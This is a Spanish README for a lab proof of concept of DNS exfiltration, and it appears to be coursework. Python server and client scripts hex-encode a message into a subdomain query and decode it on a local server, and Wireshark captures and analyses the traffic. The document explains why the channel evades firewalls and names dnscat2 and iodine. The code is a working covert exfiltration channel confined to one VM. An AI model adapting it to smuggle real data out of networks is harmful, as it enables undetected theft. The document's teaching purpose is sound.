# DNSpy — Exfiltración de datos mediante consultas DNS (PoC)

Prueba de concepto de **exfiltración de datos a través del protocolo DNS**, usando Python y `dnspython` para codificar un mensaje oculto dentro de un subdominio y capturando el tráfico resultante con Wireshark.

## Índice

1. [Arquitectura de la prueba](#1-arquitectura-de-la-prueba)
2. [Comprobación del entorno](#2-comprobación-del-entorno)
3. [Scripts](#3-scripts)
4. [Instalación de dependencias](#4-instalación-de-dependencias)
5. [Captura con Wireshark](#5-captura-con-wireshark)
6. [Ejecución](#6-ejecución)
7. [Análisis de la captura de Wireshark](#7-análisis-de-la-captura-de-wireshark)

---

## 1. Arquitectura de la prueba

> **Importante:** en esta PoC, cliente y servidor se ejecutan en **la misma máquina** (la VM con IP estática `192.168.6.100`). No son dos equipos distintos — por eso en la captura de Wireshark tanto el origen como el destino de las tramas muestran la misma IP. El cliente se apunta a la IP real de la interfaz de red (en vez de a `127.0.0.1`) precisamente para forzar que el tráfico pase por la interfaz física/virtual y así poder capturarlo con Wireshark, en lugar de viajar por loopback.

```mermaid
sequenceDiagram
    participant C as Cliente<br/>dns_client_1_peticion.py<br/>(192.168.6.100)
    participant S as Servidor<br/>dns_server_1_peticion.py<br/>(192.168.6.100:53/UDP)

    Note over C: Codifica "datos ocultos"<br/>a hexadecimal
    C->>S: Query DNS tipo A<br/>6461746f73...6c746f73.secreto.com
    Note over S: Extrae el subdominio<br/>y lo decodifica de hex a texto
    Note over S: "datos ocultos" recuperado
    S-->>C: Response DNS (NOERROR)<br/>secreto.com → 4.3.2.1
    Note over C: Conexión cerrada<br/>tras 1 petición/respuesta
```

El dato que se quiere exfiltrar (`datos ocultos`) nunca viaja en un campo "sospechoso": va camuflado dentro del nombre de dominio consultado, que es justo el tipo de tráfico que casi ningún firewall bloquea o inspecciona en profundidad.

---

## 2. Comprobación del entorno

Antes de ejecutar los scripts se comprobó la versión de Python 3 instalada, para asegurar la compatibilidad:

```bash
python3 --version
```

---

## 3. Scripts

Para realizar la prueba usando la IP real de la red estática de la VM (en lugar de `127.0.0.1`), se dejó el servidor escuchando en todas las interfaces y se apuntó el cliente a la IP estática.

### 2.1 Servidor — `dns_server_1_peticion.py`

Escucha en `0.0.0.0:53/UDP`, extrae el subdominio de la petición, decodifica el texto en hexadecimal y responde con un registro `A` ficticio (`4.3.2.1`).

```python
#!/usr/bin/python3
# Archivo ....: dns_server_1.py
# Autor ......: Gabriel Martí
# Fecha ......: 20/12/2022

import socket
import dns.message
import dns.name
import dns.rdata
import dns.rdataclass
import dns.rdatatype
import dns.rrset

# Declaración de variables
servidor = "0.0.0.0"        # Escucha en todas las interfaces de red
puerto = 53                 # Puerto 53 DNS
buffer = 4096               # Tamaño buffer
dominio = "secreto.com."    # Nombre de dominio absoluto para la respuesta
ip_respuesta = "4.3.2.1"    # IP falsa de respuesta

# Crear un socket servidor UDP
server_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
server_socket.bind((servidor, puerto))

print("Esperando 1 peticion DNS...")

while True:
    # Recibir una petición del cliente
    request_data, client_address = server_socket.recvfrom(buffer)

    # Deserializar la petición
    request = dns.message.from_wire(request_data)

    print("Recibida petición DNS")
    print(request)

    # Extraer el nombre de dominio completo de la petición
    full_domain_name = request.question[0].name.to_text()
    print("Nombre dominio completo: " + full_domain_name)

    # Extraer la parte del nombre de subdominio
    subdomain = full_domain_name.split(".")[0]
    print("Subdominio recibido: " + subdomain)

    try:
        # Convierte nombre de subdominio en hexadecimal a los datos reales
        datosreales = bytes.fromhex(subdomain).decode()
        print("Mensaje oculto recibido: " + datosreales)
    except Exception as e:
        print("No hay datos en hexadecimal")

    # Prepara la respuesta DNS
    response = dns.message.make_response(request)
    response.id = request.id
    response.set_rcode(dns.rcode.NOERROR)

    # Añade la respuesta A
    response.answer.append(dns.rrset.from_text(dominio,
                                               300,
                                               dns.rdataclass.IN,
                                               dns.rdatatype.A,
                                               ip_respuesta))

    # Serializar y enviar respuesta
    response_data = response.to_wire()
    server_socket.sendto(response_data, client_address)

    # Rompe el bucle tras la primera petición
    break
```

### 2.2 Cliente — `dns_client_1_peticion.py`

Se cambió la variable `servidor` de `127.0.0.1` a la IP fija de la VM (`192.168.6.100`) para que las tramas se enviasen realmente por la interfaz de red.

```python
#!/usr/bin/python3
# Archivo ....: dns_client_1.py
# Autor ......: Gabriel Martí
# Fecha ......: 20/12/2022

import dns.message
import dns.query

# --- CAMBIO REALIZADO ---
# Se cambió "127.0.0.1" por la IP de la interfaz estática de la VM
servidor = "192.168.6.100"                  # IP estática de la VM
puerto = 53                                 # Puerto DNS
dominio = "secreto.com"                     # Nombre de dominio inventado
subdominio = "6461746f73206f63756c746f73"   # "datos ocultos" en hexadecimal

# Formar el FQDN completo con los datos exfiltrados
dominiocompleto = subdominio + "." + dominio

print("Inicio del envio")

# Crear consulta DNS de Registro A
request = dns.message.make_query(dominiocompleto, dns.rdatatype.A)

# Enviar la petición al servidor DNS y esperar respuesta (timeout de 5s)
response = dns.query.udp(request, servidor, timeout=5)

# Imprimir la respuesta recibida
print("Respuesta: ", response)

print("Fin del envío")
```

---

## 4. Instalación de dependencias

Al ejecutar los scripts, Python lanzó un error al no encontrar el módulo `dns.message`. En Debian 13 se solucionó instalando la librería oficial desde los repositorios del sistema:

```bash
sudo apt update
sudo apt install python3-dnspython -y
```

---

## 5. Captura con Wireshark

Instalación de Wireshark:

```bash
sudo apt install wireshark -y
```

Ejecución con privilegios de superusuario:

```bash
sudo wireshark
```

En la interfaz gráfica:

- Se seleccionó la interfaz **any** (*Capturing from any*).
- Se aplicó el filtro `dns` en la barra de filtros.

---

## 6. Ejecución

Con Wireshark capturando en segundo plano, se abrieron dos terminales en la carpeta de los scripts (`~/Desktop`):

**Terminal 1 — Servidor** (se ejecuta con `sudo` para poder abrir el puerto restringido 53/UDP):

```bash
sudo python3 dns_server_1_peticion.py
```

Salida inicial: `Esperando 1 peticion DNS...`

**Terminal 2 — Cliente:**

```bash
sudo python3 dns_client_1_peticion.py
```

Al ejecutarse, el servidor capturó la consulta, decodificó el subdominio `6461746f73206f63756c746f73` a `datos ocultos`, respondió al cliente con la IP `4.3.2.1` y ambos programas finalizaron con éxito.

![Terminales mostrando la ejecución del cliente y el servidor](img/terminales.png)

---

## 7. Análisis de la captura de Wireshark

### Qué mirar y por qué

Al abrir la captura conviene fijarse en tres sitios concretos, cada uno responde a una pregunta distinta:

| Dónde mirar | Qué confirma |
|---|---|
| **Source / Destination** | Que el tráfico pasó realmente por la interfaz de red (y no por loopback) |
| **Info** | El payload exfiltrado, visible en texto plano dentro del propio nombre de dominio consultado |
| **Panel de hexdump** (bytes crudos) | Que ese mismo dato va embebido en la estructura estándar del paquete DNS, sin ningún campo "extra" ni cifrado |

### Trama 1 — Petición (Query)

- **Source / Destination:** `192.168.6.100 → 192.168.6.100` — confirma que la petición se envió a la IP estática de la interfaz de red de la VM y no a la interfaz de loopback (`127.0.0.1`). Al ser cliente y servidor la misma máquina, origen y destino coinciden, pero el punto clave es que **no es `127.0.0.1`**: la trama atravesó la interfaz de red real y por tanto es equivalente a lo que vería un firewall o un sniffer colocado en el perímetro de una red.
- **Length:** 100 bytes.
- **Info:** `Standard query 0x4a2e A 6461746f73206f63756c746f73.secreto.com`

  El subdominio decodifica así:

  ```
  6461746f73206f63756c746f73  (hex)
          ↓
  "datos ocultos"             (texto)
  ```

### Trama 2 — Respuesta (Response)

- **Source / Destination:** `192.168.6.100 → 192.168.6.100`.
- **Length:** 116 bytes.
- **Info:** `Standard query response 0x4a2e A 6461746f73206f63756c746f73.secreto.com` — respuesta del servidor con código `NOERROR` y el registro `A` ficticio `secreto.com → 4.3.2.1`.

**Panel de hexdump:** al seleccionar la trama de respuesta se observa el texto ASCII incrustado en el paquete (`secreto.com` y la IP de respuesta `4.3.2.1`). No hay ningún campo adicional ni cabecera fuera de lo estándar: el dato viaja camuflado dentro de la propia estructura de una consulta DNS legítima.

![Captura de Wireshark con las dos tramas DNS](img/wireshark.png)

### Por qué esto es interesante en seguridad

Para un **sniffer de red** o un **firewall con inspección profunda de paquetes (DPI)**, estas dos tramas son indistinguibles, a primera vista, de cualquier resolución DNS normal: mismo protocolo, mismo puerto (53/UDP), misma estructura de petición/respuesta. No hay payload "extra" que destaque, ni un puerto raro, ni cifrado que levante alertas. El dato exfiltrado está disfrazado como si fuera simplemente el nombre de un subdominio a resolver.

Esto es precisamente lo que hace del DNS un canal atractivo para **exfiltración de datos y comunicación con servidores de mando y control (C2)**: el tráfico DNS saliente casi nunca se bloquea (una red sin DNS no funciona) y rara vez se inspecciona con el mismo rigor que HTTP/HTTPS.

### Una limitación técnica real: el tamaño

El campo `Length` de las tramas (100 y 116 bytes) no es casual — está acotado por los límites del propio protocolo DNS:

- Cada **etiqueta** (segmento entre puntos) de un nombre de dominio puede tener como máximo **63 caracteres**.
- El **FQDN completo** no puede superar los **253 caracteres**.

Esto significa que, por consulta, solo se pueden exfiltrar unos pocos bytes de datos codificados en hexadecimal (el doble de caracteres que el dato original, al estar en hex). Un mensaje largo necesitaría **fragmentarse en múltiples consultas DNS**, lo cual es justo como funcionan las herramientas reales de DNS tunneling (p. ej. `dnscat2`, `iodine`).

---
